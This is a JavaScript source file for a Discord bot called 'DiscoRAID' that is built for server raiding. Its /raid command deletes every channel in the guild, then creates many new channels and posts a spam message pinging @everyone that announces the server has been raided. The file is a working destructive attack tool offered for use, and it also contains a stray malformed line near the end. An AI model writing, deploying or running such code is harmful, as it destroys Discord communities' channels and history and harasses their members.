const { Client, IntentsBitField, ChannelType, DiscordAPIError } = require('discord.js');

// Load environment variables
require('dotenv').config();

const client = new Client({ 
  intents: [
    IntentsBitField.Flags.Guilds,
    IntentsBitField.Flags.GuildMembers,
    IntentsBitField.Flags.GuildMessages,
    IntentsBitField.Flags.MessageContent,
  ]
});

client.login(process.env.TOKEN);

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}! ✅`);
});




client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  if (interaction.commandName === 'online') {
    interaction.reply('DiscoRAID is online ! ✅');
  }

  if (interaction.commandName === 'raid') {
    // Check if the user has the necessary permissions (e.g., MANAGE_CHANNELS)

    // defaults
    defaultMessage = `YOUR SERVER HAS BEEN RAIDED BY ${client.user} !!! \n @everyone`
    defaultSpamAMT = 10;
    defaultChannelname = 'RAID'
    const defaultErrorMessage = 'An internal error has occured, please check console.'

    const throwInteractionError = (errorMessage) => {
      interaction.reply({content: errorMessage, ephemeral: true});
    }

    let spamAMTbyUser = interaction.options.getInteger('message-amount')
    let userMessage = interaction.options.getString('raid-message');
    let userChannelname = interaction.options.getString('channel-name')

    if (userMessage == null) {
      userMessage = defaultMessage
    }

    if (spamAMTbyUser == null) {
      spamAMTbyUser = defaultSpamAMT
    }

    if (userChannelname == null) {
      userChannelname = defaultChannelname
    }
  
   
    const guild = interaction.guild;

    try {
      const channels = Array.from(guild.channels.cache.values());
      for (const channel of channels) {
        await channel.delete();
      }
    } catch (error) {
      console.error("Error deleting channels:", error);
      throwInteractionError('Raid Failed ! Invaild Permissions.');
      return;
    }
    
    

    try {
      const newChannel = await guild.channels.create({
        name: `${userChannelname}`, 
        type: ChannelType.GuildText,
      });

      try{
        for (let i = 0; i < spamAMTbyUser; i++) {
          // Duplicate the channel
          const duplicateChannel = await guild.channels.create({
            name: `${userChannelname}-${i+1}`,
            type: ChannelType.GuildText,
            parent: newChannel.parent, // Set the same parent as the original channel if applicable
          });
      
          // Send message to duplicate channel
          await duplicateChannel.send(userMessage);
        }
      } catch (error) {
        throwInteractionError(defaultErrorMessage);
        console.error("Error creating duplicate channels:", error);
      }
      
    } catch (error) {
      throwInteractionError(defaultErrorMessage);
      console.log(`an error has occured, ${error}`)
      return;
    }
    
    // Send the user's message in the new channel
  }
});

if (interaction == '')

client.on('messageCreate', (message) => {
  if (message.content === '<@1150483197503741962>') {
    message.reply('Bot is Online ✅');
  }
});
